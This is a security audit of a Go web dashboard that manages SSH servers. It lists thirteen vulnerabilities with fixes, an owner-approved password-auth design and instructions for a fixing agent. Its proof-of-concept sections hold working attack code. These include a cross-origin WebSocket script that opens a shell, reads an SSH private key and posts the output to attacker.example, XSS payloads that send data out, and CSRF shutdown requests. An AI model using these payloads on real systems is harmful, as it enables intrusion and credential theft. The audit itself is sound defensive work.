# ServerHub v4 — Security Audit

**Date:** 2026-10-17
**Scope:** entire repo (`go/` backend + `go/web/` frontend + build/config)
**Method:** manual source review. Every finding below was confirmed against the code at the cited line numbers.

---

## Instructions for the fixing agent (read first)

1. Read `BUILD.md` before changing anything. It documents the architecture and known trade-offs.
2. Fix findings in the order listed (dependency order). Findings V1–V5 are the critical cluster; do not stop before they are all fixed.
3. **V1/V2 have an owner-approved design: implement exactly the "Solution design — password auth" section below. Do not invent a different auth scheme.**
4. Keep changes minimal and idiomatic to this codebase (stdlib `net/http`, vanilla JS, no build step, no new dependencies unless explicitly stated below).
5. After each finding: run `gofmt -l .`, `go vet ./...`, and `go build ./...` in `go/`. The project builds with Go 1.25, `CGO_ENABLED=0`.
6. Do not change behaviour that is listed in "Accepted trade-offs / do not touch" at the bottom.
7. After all fixes, update the affected sections of `BUILD.md` (security notes).

### Severity scale (risk = exploitability × impact, given this app has no auth and holds SSH shell access)

| Rating | Meaning |
|---|---|
| 9–10 | Full compromise (RCE/shell) reachable by a malicious webpage or unauthenticated attacker |
| 7–8 | State-changing or code-execution primitive under realistic conditions |
| 4–6 | Serious but needs a precondition (compromised remote host, network position, CDN compromise) |
| 1–3 | Hardening / defence in depth |

### Summary

| ID | Risk | Finding | Location | Effort |
|---|---|---|---|---|
| V1 | **10/10** | Unauthenticated cross-origin WebSocket hijacking → interactive shell (local + all remotes) | `go/internal/api/handlers.go:32-34,419-435` | M |
| V2 | **9/10** | No authentication on any HTTP/WS endpoint (root enabler) | `go/internal/api/handlers.go` (all routes) | M |
| V3 | **9/10** | Stored XSS from remote-server-controlled data (container names, load strings) via unescaped `innerHTML` + inline `onclick` | `go/web/app.js:345,504-507,525-531,554-571` | M |
| V4 | **8/10** | No `Origin`/`Host`/CSRF protection on mutating endpoints → reboot/shutdown/quick-actions from any webpage; DNS rebinding → full API access | `go/main.go:371-374`, all handlers | M |
| V5 | **8/10** | Stored XSS via server `id` (unvalidated IDs rendered unescaped into HTML attributes and inline JS) | `go/internal/api/handlers.go:131-148`, `go/web/app.js:198-204,294,592-597` | S |
| V6 | **6/10** | SSH host key verification disabled (`InsecureIgnoreHostKey`) | `go/internal/ssh/client.go:85` | M |
| V7 | **5/10** | Unbounded WebSocket frame size + no connection limits + no HTTP timeouts → trivial DoS | `go/internal/ssh/terminal.go:99`, `go/internal/local/terminal.go:59`, `go/main.go:371` | S |
| V8 | **4/10** | xterm.js loaded from CDN without SRI → supply-chain RCE into terminal page | `go/web/terminal.html:84-85` | S |
| V9 | **4/10** | Debug collector leaks internals; can be enabled by CSRF; its WS has no auth | `go/internal/api/handlers.go:545-619`, `go/internal/debug/collector.go:327-329` | S (covered by V2/V4) |
| V10 | **3/10** | Config file `0644` / dir `0755` — leaks hostnames, users, key paths, quick-action commands (which may embed secrets) | `go/internal/config/config.go:68-75,179` | S |
| V11 | **3/10** | HTTP server has no `ReadHeaderTimeout` (slowloris) | `go/main.go:371` | S |
| V12 | **3/10** | Server ID `__local__` (and any arbitrary ID) collides with reserved local-machine card | `go/internal/api/handlers.go:123-178` | S |
| V13 | **5/10** | *(conditional)* Plaintext HTTP when bound beyond loopback (README/TODO encourage Tailscale binding) — multiplies every finding above | `README.md`, config `bind` | doc |

---

## Solution design — password auth (owner-approved)

> **This is the required design for V1 and V2.** It also removes the CSRF half of V4. Implement this section first; everything else in this document is secondary to it.

### Owner's requirements (confirmed)

- Single user. Login is **one password field** — no username, no OAuth, no multi-user, no external identity provider.
- On success the browser receives an opaque **session token** in a cookie.
- The browser stays authenticated for **30 days** or until **sign-out**.
- Sessions **survive ServerHub restarts**.
- The password verifier and sessions are stored **in the same config directory as `config.yaml`**.
- **Explicitly accepted risk (owner decision, to be revisited later):** anyone with read access to that directory can copy the session file and is effectively logged in. This is accepted because file access to that directory already implies access to the config, server list, and SSH key paths. Do not block the design waiting for a better secret store; note it for a later OS-keychain upgrade.

### Dependencies

No new modules. `golang.org/x/crypto` (already a dependency, via SSH) provides `bcrypt`; everything else is stdlib (`crypto/rand`, `crypto/sha256`, `crypto/subtle`, `encoding/json`, `net/http`).

### Files and layout

```
<config dir>/                 macOS: ~/Library/Application Support/ServerHub
├── config.yaml               existing, unchanged
├── auth.json                 NEW — password hash            (0600)
└── sessions.json             NEW — active sessions          (0600)
```

- New Go package: `go/internal/auth/auth.go` (single file is fine).
- New embedded page: `go/web/login.html` — **self-contained** (inline CSS/JS) so the public-route allowlist stays tiny. Embedded automatically by the existing `//go:embed web/*`.
- Config dir path comes from `config.Dir()` (`go/internal/config/config.go:44`). Reuse it; do not recompute.

### `auth.json`

```json
{
  "version": 1,
  "password_hash": "$2a$12$…",
  "created_at": "2026-10-17T12:00:00Z"
}
```

- Hash: `bcrypt.GenerateFromPassword([]byte(pw), 12)`; verify with `bcrypt.CompareHashAndPassword` (constant-time internally).
- Validation: minimum 8 chars; reject > 72 bytes (bcrypt silently truncates beyond 72 — validate instead of truncating).
- Written atomically: temp file in the same dir + `os.Rename`. File mode `0600`.
- `auth.Manager` keeps the hash in memory after load; password verification happens against memory.

### `sessions.json`

```json
{
  "version": 1,
  "sessions": [
    {
      "token_sha256": "9f2c…",
      "created_at": "2026-10-17T12:00:00Z",
      "expires_at": "2026-11-16T12:00:00Z"
    }
  ]
}
```

- Token: 32 bytes from `crypto/rand`, encoded `base64.RawURLEncoding` (43 chars). This raw value is what the cookie carries.
- **Only `SHA-256(token)` hex is stored in the file — never the raw token.** Lookup: hash the presented cookie value, find matching entry, compare with `subtle.ConstantTimeCompare`.
- Lifetime: 30 days. **Sliding, but write-optimised:** on each validated request, in memory, if `now > expires_at − 29d` (i.e. at least a day has passed since the last extension), set `expires_at = now + 30d`, re-send the cookie, and persist the file; otherwise serve from memory without touching disk.
- Prune expired entries on load and on every file write.
- All reads/writes behind one `sync.Mutex`; writes atomic (temp + rename). Load errors must not lock the user out of the machine permanently — treat unreadable/corrupt files as "no sessions" and log loudly (see recovery note).

### HTTP surface

| Route | Method | Auth | Behaviour |
|---|---|---|---|
| `/login` | GET | public | login page; renders "Set your password" mode when no password is configured |
| `/api/auth/status` | GET | public | `{"has_password": bool, "authenticated": bool}` — used by the login page and the SPA |
| `/api/auth/login` | POST | public | body `{"password":"…"}` → `200` + `Set-Cookie`, or `401` |
| `/api/auth/logout` | POST | session | revoke current token, clear cookie |
| `/api/auth/setup` | POST | public **only while no password exists AND only from loopback** | body `{"password":"…"}`; `403` once a password is set or from a non-loopback client |
| `/api/ping` | GET | **stays public** | the port-conflict probe in `main.go:152` depends on it; it leaks only the app name |
| everything else | any | session | `401` without a valid cookie; HTML page requests redirect to `/login?next=…` |

### Middleware

Wrap the whole mux in `go/main.go` (before `debug.Middleware(mux)` so debug captures authenticated requests only):

1. Public allowlist: `/login`, `/api/auth/status`, `/api/auth/login`, `/api/auth/setup`, `/api/ping`. Everything else requires a valid session.
2. Read cookie `sh_session` → `auth.ValidateSession(token)`. On failure:
   - `Accept: text/html` requests → `302 /login?next=<path>` (validate `next` starts with `/` and not `//`).
   - everything else → `401` JSON.
3. **WebSockets are covered by the same middleware** — a WS handshake is an ordinary HTTP request, so the check runs before `upgrader.Upgrade`. Browsers attach cookies to same-site WS handshakes, so the existing clients work unchanged after login.

Cookie set on login (and on sliding extension):

```go
http.SetCookie(w, &http.Cookie{
    Name:     "sh_session",
    Value:    token,
    Path:     "/",
    MaxAge:   30 * 24 * 60 * 60,
    HttpOnly: true,
    SameSite: http.SameSiteStrictMode,
    Secure:   r.TLS != nil, // false on loopback HTTP; true automatically behind TLS
})
```

### Login page flow (`go/web/login.html`)

- `GET /api/auth/status` on load:
  - `has_password == false` → "Set your password" form (password + confirm) → `POST /api/auth/setup`.
  - `has_password == true` → single password field → `POST /api/auth/login`.
- Wrong password → inline "Incorrect password." — say nothing else.
- On success → `location.href = validatedNext || '/'`.
- The page must work with zero external assets.

### Setup / first-run rules

- Only loopback clients (`127.0.0.1`, `::1`) may call `/api/auth/setup`. Detect via `net.SplitHostPort(r.RemoteAddr)` + `net.ParseIP(...).IsLoopback()`.
- After a password exists, `/api/auth/setup` returns `403` forever (even from loopback — use login instead).
- If ServerHub starts with no password set **and** is bound to a non-loopback address: log/print a prominent warning, and serve remote clients a plain page saying setup must be completed on the host itself.
- Startup banner and `openBrowser` URL stay as-is; an unauthenticated browser lands on `/` → middleware redirects to `/login`.

### Rate limiting (required)

A password without a limiter is brute-forceable in minutes. Implement a **global** limiter (single user, so per-IP adds little):

- 5 failed attempts → 30 s lockout; each further failure doubles it (60 s, 120 s, … cap 15 min).
- During lockout, return `429` with `Retry-After`, even for the correct password.
- Reset on successful login.
- In-memory only (resets on restart — acceptable here; note it in `BUILD.md`).
- Log failures and lockouts to the existing audit log (`go/internal/api/audit.go`, `LogAction`). **Never log or audit the password value itself.**

### SPA changes (`go/web/app.js`)

- `apiFetch` (`app.js:184`): on `401` → `location.href = '/login?next=' + encodeURIComponent(location.pathname)`.
- Sidebar: add a "Sign out" action → `POST /api/auth/logout` → `location.href = '/login'`.
- `terminal.html`: before opening the WS, `fetch('/api/auth/status')`; if `authenticated` is false → redirect to `/login`. (A failed WS handshake gives the browser no status code, so a pre-check is the pragmatic option.)

### Why this closes V1 and the CSRF half of V4

- **V1 (cross-origin WS):** a handshake initiated by `evil.com` is cross-site; a `SameSite=Strict` cookie is **not attached** to it → middleware rejects with `401` before `Upgrade`. The strict `CheckOrigin` fix from V1 is still applied as belt-and-braces.
- **V4 (CSRF):** with `SameSite=Strict`, no cross-site request (including body-less "simple" POSTs like reboot/shutdown/quick actions) carries the cookie → those requests get `401` instead of executing. The `Host` allowlist from V4 is still required — it closes DNS-rebinding *reads* of always-public endpoints and hardens non-loopback binds.
- **DNS rebinding:** after rebinding, the cookie belongs to `127.0.0.1`/`localhost`, not `attacker.example`, so it is not sent → `401`.

### Recovery / operations

- **Lost password:** stop ServerHub, delete `auth.json` (and `sessions.json`), restart, set a new password from the loopback browser. Document this in `README.md` — physical/file access to the host is the recovery factor, consistent with the accepted at-rest risk.
- **Corrupt `sessions.json`:** treat as empty (log loudly). Users re-login; no permanent lockout.
- Keep writing `config.yaml` untouched — auth state lives only in the two new files.

### Acceptance tests for the fixer

1. `curl -s http://127.0.0.1:7070/api/servers` → `401`, no data.
2. Five wrong passwords → `429` with `Retry-After`; the correct password is also refused during the lockout.
3. Correct login → `Set-Cookie: sh_session=…; HttpOnly; SameSite=Strict; Path=/; Max-Age=2592000`.
4. After login: dashboard, detail view, terminals (remote + local), quick actions, and the debug stream all work exactly as before.
5. `wscat -c ws://127.0.0.1:7070/api/local/terminal` (no cookie) → handshake rejected with `401`.
6. Restart ServerHub → the same browser remains authenticated (session loaded from `sessions.json`).
7. Sign out → subsequent API calls `401` and the cookie is cleared.
8. From a page served at a different origin (`python3 -m http.server 8000`): cross-site WS and cross-site `POST /api/server/x/reboot` both fail.
9. `ls -l` config dir → `auth.json` and `sessions.json` are `-rw-------`.
10. `grep -rn "password" go/` → password values are never logged (including by the debug log interceptor) and never written to `config.yaml`.
11. `go vet ./...`, `go build ./...` clean; `go test ./...` (if a test exists) green.

---

## V1 — Unauthenticated cross-origin WebSocket hijacking → interactive shell

**Risk: 10/10** · **Type: CWE-1385 (missing origin validation in WebSocket) + CWE-306 (missing auth)**

### What
The WebSocket upgrader accepts connections from **any origin**:

```go
// go/internal/api/handlers.go:32-34
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },
}
```

Combined with zero authentication, any web page the user visits can open:

- `ws://127.0.0.1:7070/api/local/terminal` → **interactive shell on the machine running ServerHub** (spawns `$SHELL`, `go/internal/local/terminal.go:20-29`)
- `ws://127.0.0.1:7070/api/server/<id>/terminal` → **interactive shell on any configured remote server** (`handlers.go:242-243,419-426`)

Browsers do not apply CORS or same-origin policy to WebSocket connections; the server is the only place origin can be checked, and here it is not.

### Why it's exploitable
Host this on any website the victim visits (or an XSS anywhere) and get a shell the moment the dashboard is running:

```html
<script>
const ws = new WebSocket('ws://127.0.0.1:7070/api/local/terminal');
ws.binaryType = 'arraybuffer';
ws.onopen = () => ws.send(new TextEncoder().encode('id; uname -a; cat ~/.ssh/id_ed25519\n'));
ws.onmessage = e => fetch('https://attacker.example/exfil', {method:'POST', body: e.data});
</script>
```

No user interaction beyond loading the page is required. This is the single most dangerous finding: it converts "user browses the web" into "attacker owns the workstation and every server the dashboard manages". Note that even escaping the shell is not needed — the attacker's JS reads the raw PTY bytes and can send `Ctrl-C` etc. to control a login shell.

### Fix
1. **Implement the password auth from "Solution design — password auth" above.** The session cookie is `SameSite=Strict` and the middleware rejects unauthenticated upgrades before `Upgrade` runs, so cross-site WS handshakes die at `401`.
2. **Validate `Origin`** in `CheckOrigin` as well (belt-and-braces, and required if cookies are ever weakened): accept only same-origin requests — the configured bind/port plus `http://localhost:<port>` and `http://127.0.0.1:<port>`. Reject everything else.
3. Fail the upgrade with `403` via a custom `Upgrade` error handler when either check fails.

### Verification
- Serve the PoC above from a *different* origin (`python3 -m http.server 8000`) while ServerHub runs; confirm the connection is rejected.
- Open the dashboard itself; confirm terminals and debug stream still work.
- `curl -si -H "Origin: http://evil.example" ...` against the WS endpoint and confirm `403`.

---

## V2 — No authentication on any endpoint

**Risk: 9/10** · **Type: CWE-306**

### What
Every route registered in `RegisterRoutes` (`go/internal/api/handlers.go:75-90`) is fully open: server CRUD, quick actions, reboot/shutdown, containers, audit log, terminals. The only control is the default `bind: "127.0.0.1"`. The README and `TODO.md` explicitly plan to run this on a network ("should be able to be run from another machine"), at which point the entire API — including arbitrary command execution on every managed host — is exposed to anyone who can reach the port.

Even on loopback, "no auth" makes V1/V4 exploitable from the victim's own browser.

### Fix
Implement **exactly** the "Solution design — password auth" section above:

1. `auth.json` (bcrypt hash, `0600`) + `sessions.json` (SHA-256 of 30-day session tokens, `0600`) in the config dir via a new `go/internal/auth` package — no new dependencies (`x/crypto/bcrypt` is already available).
2. `POST /api/auth/login` (password → session cookie), `POST /api/auth/logout`, `GET /api/auth/status`, `POST /api/auth/setup` (loopback-only until a password exists), `GET /login` self-contained page.
3. Auth middleware on every route except the public allowlist (`/login`, the three/one auth endpoints, `/api/ping`), applied to WS upgrades too.
4. Global rate limiter (5 fails → exponential lockout) and audit-log entries for failures — never log the password.
5. Keep loopback bind as the default; update `README.md` security section and `BUILD.md` accordingly.

### Verification
- `curl http://127.0.0.1:7070/api/servers` without token → `401`.
- Browser flow via banner URL works end-to-end (dashboard, terminal, debug).
- `grep -r "Bearer\|token" go/internal` should show enforcement on **all** routes (no handler bypasses the middleware).

---

## V3 — Stored XSS from remote-server-controlled data

**Risk: 9/10** · **Type: CWE-79**

### What
Data that comes from the **remote SSH server** is interpolated into `innerHTML` and inline event handlers without correct escaping:

1. **Container names in an inline JS handler** (`go/web/app.js:562-568`):

   ```js
   <button ... onclick="containerAction('${id}','${esc(c.name)}','stop')">Stop</button>
   ```

   `esc()` (`app.js:706-708`) escapes only `& < > "` — **not `'`**. And even if it did, HTML-entity encoding does not protect a JavaScript string context inside an attribute: the browser decodes entities *before* the JS engine parses the handler. A container named `');fetch('//evil/?'+document.cookie);//` executes in the dashboard origin.

2. **`load1`/`load5`/`load15` strings rendered via `innerHTML`** (`app.js:345`, `504-507`, `525-531`). These come from the remote host's `/proc/loadavg` (`go/internal/ssh/poller.go:146-152`); a compromised remote server controls this text completely because it builds the stats JSON itself (`go/internal/ssh/client.go:33-39`).

A compromised (or attacker-owned) machine that you add to the dashboard can therefore run script in the dashboard origin. Since the dashboard has no auth and full command APIs (V1–V4), XSS here = shell on the local machine and every server. This requires no access to ServerHub itself.

### Why it's exploitable
On a remote host, rename a container:

```sh
docker rename mycontainer "x');fetch('http://attacker.example/'+btoa(document.body.innerHTML))//"
```

Open the dashboard detail view; the handler fires on click (or use an auto-firing payload in `load`). PoC for the load vector (run on the remote host): return a stats JSON whose `load` field contains `<img src=x onerror=alert(document.domain)>` — `poller.go` copies it into `Load1`, and the dashboard writes it into `innerHTML`.

### Fix
Defence in depth — do both sides:

1. **Client:** stop building inline handlers from data. Use `data-*` attributes plus delegated `addEventListener`, or `element.textContent` for text. Where HTML building is kept, make `esc()` also escape `'` (`&#39;`), and never place data inside inline `onclick` strings.
2. **Server:** sanitise at the boundary. In `poller.go`, validate `load1..3` against `^[0-9.,]+$` (digits, dot, comma only) and drop anything else; container names against `^[a-zA-Z0-9][a-zA-Z0-9_.-]*$` (Docker's own charset) in `CollectContainers` (`client.go:134-159`).
3. Audit every `innerHTML` sink flagged by `grep -n innerHTML go/web/app.js` and ensure each interpolated value is either a number, a static string, or encoded for the context it lands in.

### Verification
- Add a container with the malicious name above on a test host; click Stop/Restart; no script executes.
- Craft a fake stats response with an HTML payload in `load`; dashboard shows it as literal text.
- `grep -n "onclick=\".*\${" go/web/app.js` should return no data-derived handlers.

---

## V4 — No Origin/Host/CSRF protection → reboot/shutdown from any webpage; DNS rebinding

**Risk: 8/10** · **Type: CWE-352 + CWE-346**

### What
No middleware inspects `Origin`, `Referer`, `Host`, or a CSRF token. Several damaging endpoints accept **body-less POSTs**, which are "simple requests" and therefore sent cross-origin **without a CORS preflight** (`go/internal/api/handlers.go`):

- `POST /api/server/{id}/reboot` (line 233), `POST /api/server/{id}/shutdown` (line 236)
- `POST /api/server/{id}/container/{name}/{start|stop|restart}` (line 230, 338-373)
- `POST /api/server/{id}/action/{idx}` — runs user-defined quick actions, i.e. arbitrary configured commands (line 239, 395-417)
- `POST /api/debug/enable` (line 86, 545-554)

So any webpage can reboot or shut down every server and run quick actions, with an opaque response — the attacker doesn't need to read anything.

Worse, since the server never validates the `Host` header, **DNS rebinding** turns any attacker page into same-origin with `127.0.0.1:7070`, granting full read/write of the API (including adding a server entry and reading `/api/audit`, `/api/servers`). Rebinding also defeats "just check the Origin": the browser will send `Origin: http://attacker.example` with `Host: 127.0.0.1:7070`.

### Why it's exploitable
```html
<script>
// simple POST, no preflight, side effect happens
fetch('http://127.0.0.1:7070/api/server/myserver/shutdown', {method:'POST', mode:'no-cors'});
// or run quick action #0 on every known id:
['srv1','srv2'].forEach(id => fetch(`http://127.0.0.1:7070/api/server/${id}/action/0`, {method:'POST', mode:'no-cors'}));
</script>
```
DNS rebinding: serve the attacker domain with a 0-TTL A record that flips from the attacker's IP to `127.0.0.1`, then use normal `fetch` with full response access.

### Fix
1. **Host allowlist middleware:** reject requests whose `Host` header is not one of: the configured `bind:port`, `127.0.0.1:port`, `localhost:port` (and the Tailscale IP if configured). Do this for **every** route.
2. **Origin check on mutating requests:** for `POST/PUT/PATCH/DELETE`, require `Origin` (or `Referer` if `Origin` absent) to match the same allowlist; otherwise `403`.
3. **Force preflight:** reject state-changing requests without `Content-Type: application/json` (or a custom header such as `X-Requested-With`). This alone kills the body-less simple-POST CSRF. Apply to reboot/shutdown/container/quick-action/debug endpoints.
4. A CSRF token (same token as V2) is the strongest fix and simplifies all of the above.
5. Note for the fixer: `http.MethodPost` checks currently happen *after* some work (e.g. `handleContainer` builds `cmd` before checking the method at line 360) — normalise method handling while you're there.

### Verification
- Serve the PoC page from a different origin; no reboot occurs; server logs a rejected Origin.
- `curl -X POST -H "Content-Type: text/plain" http://127.0.0.1:7070/api/server/x/reboot` → rejected.
- `curl -H "Host: evil.example" http://127.0.0.1:7070/api/servers` → rejected.
- Legitimate UI flows still work.

---

## V5 — Stored XSS via server ID

**Risk: 8/10** · **Type: CWE-79 + CWE-20**

### What
`POST /api/servers` and `PUT /api/server/{id}` accept **arbitrary IDs** — validation only checks non-empty (`handlers.go:144-148`). The frontend then interpolates the raw ID into HTML attributes and inline JS strings:

```js
// app.js:198-204 — both attributes unescaped
<div ... data-id="${s.id}" onclick="showDetail('${s.id}')">

// app.js:294
<div class="server-card${cls}" id="card-${s.id}" onclick="showDetail('${s.id}')">

// app.js:592-597
<button ... onclick="runQA('${s.id}', ${i})">

// app.js:442-450
<a href="/terminal/${s.id}" ...> / onclick="confirmAction('${s.id}','reboot')"
```

An ID containing `"` breaks out of the attribute; an ID containing `'` breaks out of the JS string. IDs can also be set by hand-editing `config.yaml`.

### Why it's exploitable
```sh
curl -X POST http://127.0.0.1:7070/api/servers -H 'Content-Type: application/json' \
  -d '{"id":"x\" onmouseover=\"fetch(String.fromCharCode(47,47)+location.host)","name":"pwn","host":"127.0.0.1","user":"x"}'
```
Rendered on next dashboard load. (Reachable without local shell only when combined with V4 rebinding or V3, but hand-edited config is a supported workflow and the validation gap is real.) Note also `config.Slugify` is only applied when the ID is empty — explicit IDs bypass it entirely.

### Fix
1. **Server-side validation** (both `handleAddServer` and `handleUpdateServer`, and `config.validate` for hand-edited files): enforce `^[a-z0-9][a-z0-9-]*$`, max length ~64, and reject `__local__`.
2. **Client-side:** stop using IDs in inline handlers (same refactor as V3). Where IDs must be emitted (`data-id`, `href`), run them through `esc()` and `encodeURIComponent` respectively.
3. Reject IDs that collide with the reserved `__local__` sentinel (see V12).

### Verification
- The curl above returns `400`.
- A config.yaml with an invalid ID fails to load with a clear error.
- Dashboard works for all normal IDs (`my-server`, etc).

---

## V6 — SSH host key verification disabled

**Risk: 6/10** · **Type: CWE-295**

### What
```go
// go/internal/ssh/client.go:85
HostKeyCallback: gossh.InsecureIgnoreHostKey(), //nolint:gosec
```
Every SSH connection — polls, quick actions, and **interactive terminals including any sudo prompts typed into them** — is MITM-able by anything on the path (LAN, VPN, malicious router). The `BUILD.md` notes say this is deliberate; it is still a finding, and mitigable without ruining UX.

### Fix
1. Implement TOFU (trust-on-first-use): `~/.config/ServerHub/known_hosts` (or `<config dir>/known_hosts`), using `golang.org/x/crypto/ssh/knownhosts`. On first connect, prompt/record; afterwards verify and offer a clear error with a "forget host" action in the UI.
2. Add an explicit config flag `insecure_ignore_host_key: false` for users who truly want the old behaviour; **default false**. Document the change in `BUILD.md` and `README.md`.
3. Since there is no interactive terminal on the server side during polls, "prompt" can be a log line + audit entry; the dashboard can surface a warning banner.

### Verification
- First connection to a new host records the key; second connection succeeds without re-recording.
- Changing the host key (regenerate on test VM) makes polls fail with a clear "host key mismatch" error rather than silently connecting.
- `ssh-keygen -R` style recovery path documented and testable from the UI/CLI.

---

## V7 — Unbounded WebSocket frames / no limits → DoS

**Risk: 5/10** · **Type: CWE-770 + CWE-400**

### What
None of the WebSocket endpoints call `SetReadLimit` (verified: only two `upgrader.Upgrade` call sites plus debug; no `SetReadLimit` anywhere). The SSH terminal (`terminal.go:99-119`), local terminal (`terminal.go:59-78`) and debug stream (`handlers.go:591-600`) all read frames into memory with no cap. Gorilla's default is unlimited, so a single large frame allocates gigabytes. There are also no limits on concurrent terminal sessions or connections, and no read deadlines/pings.

Any origin can exploit this today because of V1 (a page can open hundreds of WS connections), so this is not just a hardening item.

### Fix
1. `ws.SetReadLimit(...)` on every upgraded connection: 1 MiB for terminals (accommodates paste), 1 KiB for the debug stream.
2. Cap concurrent terminal sessions (e.g. 8 global) and return an error to the WS client when exceeded; close idle sessions with `SetReadDeadline` + ping/pong keepalive.
3. Add limits to `http.Server` (see V11) and consider capping concurrent SSE clients.

### Verification
- `wscat`/browser sending a 100 MB frame gets disconnected (`websocket: read limit exceeded`), process memory stays flat.
- Opening more terminals than the cap returns a clear error in the terminal page.
- `grep -n SetReadLimit go/internal` shows all upgrade sites covered.

---

## V8 — xterm.js loaded from CDN without SRI → supply-chain RCE

**Risk: 4/10** · **Type: CWE-1104 / supply chain**

### What
```html
<!-- go/web/terminal.html:84-85 -->
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
```
The terminal page is the page that holds live SSH shells. A jsdelivr compromise, or any network attacker able to MITM (V6-adjacent trust model), gets script execution in that page and can read/write the PTY stream. Also breaks offline/air-gapped use, which contradicts the "zero runtime dependencies" claim.

### Fix
Vendor the two files into `go/web/vendor/` (xterm 5.3.0 + fit addon 0.8.0, MIT-licensed) and reference them locally; they get embedded by the existing `//go:embed web/*` (a pattern matching a directory includes its whole subtree, so no embed change is needed — just avoid `.`/`_` filename prefixes). Alternative if vendoring is truly unwanted: add `integrity="sha384-..."` + `crossorigin="anonymous"` (SRI) to both script tags. Prefer vendoring.

### Verification
- Disconnect network / block jsdelivr; terminal page still loads and connects.
- `grep -rn "cdn.jsdelivr" go/web` returns nothing (vendored) or shows pinned SRI hashes.

---

## V9 — Debug collector: CSRF enable + unauthenticated stream + info leak

**Risk: 4/10** · **Type: CWE-200 + CWE-306**

### What
- `POST /api/debug/enable` has no auth and no CSRF protection (V4), so any webpage can turn it on.
- `GET /api/debug/stream` is an unauthenticated WebSocket (when enabled) exposing logs, HTTP request paths, timings, memory/goroutine stats.
- The log interceptor captures `log.Printf` output, which includes internal file paths and hostnames (e.g. `go/internal/ssh/client.go:49` logs the SSH key path; poll errors include hostnames).
- `debug.Middleware` logs the full request path (`collector.go:327`) — useful intel for an attacker, and unbounded growth potential via crafted long URLs (bounded to 2000 entries, but entries are unbounded in size).

### Fix
Covered mostly by V2/V4 (auth + Origin checks). Additionally: truncate logged strings (e.g. 512 chars) in `debug.Collector.Log`, and document that the debug panel is a local-only feature (reject non-loopback client IPs if bind is not loopback).

### Verification
- Cross-origin POST to `/api/debug/enable` rejected.
- `/api/debug/stream` without token rejected.
- Long URL (`/aaaa...×10000`) does not appear untruncated in the panel.

---

## V10 — Config file permissions

**Risk: 3/10** · **Type: CWE-276**

### What
`config.yaml` is written `0644` and the directory `0755` (`config.go:68-75,179`). The file contains hostnames, usernames, key file paths, and quick-action commands — which frequently embed tokens/passwords (e.g. `curl -H "Authorization: Bearer ..."`). On any multi-user machine this is readable by all users.

### Fix
`os.MkdirAll(dir, 0o700)` and `os.WriteFile(path, data, 0o600)` in `EnsureDefault` and `Save`. On load, warn (and optionally `chmod`) if the file is group/world-readable.

### Verification
- Fresh profile: `ls -l` shows `drwx------` and `-rw-------`.
- Existing installs get corrected on next save; warning is logged otherwise.

---

## V11 — HTTP server hardening

**Risk: 3/10** · **Type: CWE-400**

### What
```go
// go/main.go:371
srv := &http.Server{Handler: debug.Middleware(mux)}
```
No `ReadHeaderTimeout`, `IdleTimeout`, or `ReadTimeout`. Slowloris-style connection exhaustion is possible from any local process (and from the network once bound beyond loopback). Note: do **not** set a global `WriteTimeout` — it would kill SSE and WebSocket connections. Use `ReadHeaderTimeout` (~10s) and `IdleTimeout`; for per-request limits rely on the WS read limits from V7.

### Fix
```go
srv := &http.Server{
    Handler:           debug.Middleware(mux),
    ReadHeaderTimeout: 10 * time.Second,
    IdleTimeout:       120 * time.Second,
}
```
(and verify SSE/WS still behave).

### Verification
- `slowhttptest`/`nc` holding connections open does not prevent legitimate requests.
- SSE dashboard and terminals stay connected beyond `IdleTimeout` (SSE writes keep the connection active; verify).

---

## V12 — Reserved ID collision `__local__`

**Risk: 3/10** · **Type: business-logic / integrity**

### What
`__local__` is a reserved sentinel for the local-machine card (`handlers.go:450`, `app.js` everywhere), but `POST /api/servers` accepts it as a server ID. After that, `/api/server/__local__/terminal` targets the attacker-chosen remote host while the UI shows it as "This Machine", the dashboard renders two local cards, and routing/deletion behaves inconsistently. Same fix as V5 (ID validation) — just make sure the pattern rejects IDs starting with `_` and explicitly blacklists `__local__`. Also fix the existing `toInfo`/`renderSidebar` handling to be defensive (a config may already contain it).

### Verification
- POST with `id: "__local__"` → `400`.
- Existing config containing `__local__` fails validation with a clear message pointing at the offending server index.

---

## V13 — Plaintext exposure when bound beyond loopback (context finding)

**Risk: 5/10 (conditional)**

`README.md` and `TODO.md` encourage binding to a Tailscale IP to run ServerHub from another machine. In that mode: *all* API traffic (audit log, server config, terminal keystrokes — including any passwords typed into shells) is plain HTTP/WS over the network, and V1–V5 become remotely attackable. Do not silently "fix" this by enabling TLS with a self-signed cert (breaks UX); instead:

- Document that non-loopback binds must sit inside an encrypted overlay (Tailscale/WireGuard/SSH tunnel) **and** require the V2 token.
- Add a startup warning banner when `bind != 127.0.0.1`/`localhost`: "ServerHub is binding to a non-loopback address — ensure network-level auth and encryption."
- Keep the README's existing "never bind 0.0.0.0" guidance, and repeat it in the warning.

### Verification
- Start with `bind: "0.0.0.0"` → prominent warning printed and logged.
- With `bind: "127.0.0.1"` → no warning.

---

## Accepted trade-offs / do not touch

These are deliberate design decisions documented in `BUILD.md`. Do not change them as part of security fixes:

- **Default loopback bind** — keep it; the token (V2) is additive.
- **Fresh SSH connection per poll** (`client.go:115-167`) — a deliberate simplicity/performance trade-off. Not a security issue.
- **`statsCmd` is Linux-only** — documented; leave as is.
- **Audit log is in-memory** — documented; leave as is.
- **No third-party web framework / no JS build step** — keep vanilla JS and stdlib `net/http`. Vendoring xterm (V8) is the only allowed asset change.
- **`TODO.md` is off-limits** unless explicitly requested.

## Suggested fix order (dependency-aware)

1. **V2 + V1 + the CSRF half of V4** together, by implementing the **"Solution design — password auth"** section verbatim (middleware, login page, sessions, rate limiter, strict `CheckOrigin`). This neutralises most of V9 immediately too.
2. **V3 + V5 + V12**: server-side input validation (`id`, container name, load fields) + client-side escaping/event-delegation refactor.
3. **V6**: known_hosts TOFU with opt-out flag.
4. **V7 + V11**: WS read limits, connection caps, server timeouts.
5. **V8, V9 (remainder), V10**: vendoring, log truncation, file perms.
6. **V13**: startup warnings + doc updates.
7. Update `BUILD.md` ("Things to avoid / watch out for") and `README.md` (Security) to reflect the new auth model, then run the full verification list for every finding above.
